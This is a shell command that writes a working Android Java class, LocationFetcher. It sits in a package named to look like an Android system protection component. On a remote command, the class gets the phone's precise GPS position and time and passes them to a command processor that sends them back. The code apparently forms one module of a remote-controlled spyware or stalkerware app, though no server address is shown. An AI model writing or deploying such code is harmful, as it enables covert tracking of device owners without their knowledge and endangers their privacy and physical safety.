cat > app/src/main/java/com/android/system/protection/commands/LocationFetcher.java << 'EOF'
package com.android.system.protection.commands;

import android.content.Context;
import android.location.Location;
import android.os.Looper;

import com.android.system.protection.api.CommandProcessor;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.Task;

import org.json.JSONObject;

public class LocationFetcher {

    public static void fetch(Context context, JSONObject params, String commandId) {
        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);

        Task<Location> task = fusedLocationClient.getLastLocation();
        task.addOnSuccessListener(location -> {
            if (location != null) {
                JSONObject result = new JSONObject();
                try {
                    result.put("lat", location.getLatitude());
                    result.put("lng", location.getLongitude());
                    result.put("accuracy", location.getAccuracy());
                    result.put("time", location.getTime());
                } catch (Exception e) {
                    e.printStackTrace();
                }
                CommandProcessor.sendResult(context, commandId, result);
            } else {
                requestNewLocation(context, fusedLocationClient, commandId);
            }
        });
    }

    private static void requestNewLocation(Context context, FusedLocationProviderClient client, String commandId) {
        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationRequest.setNumUpdates(1);

        client.requestLocationUpdates(locationRequest, new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult.getLastLocation() != null) {
                    Location loc = locationResult.getLastLocation();
                    JSONObject result = new JSONObject();
                    try {
                        result.put("lat", loc.getLatitude());
                        result.put("lng", loc.getLongitude());
                        result.put("accuracy", loc.getAccuracy());
                        result.put("time", loc.getTime());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    CommandProcessor.sendResult(context, commandId, result);
                }
                client.removeLocationUpdates(this);
            }
        }, Looper.getMainLooper());
    }
}
EOF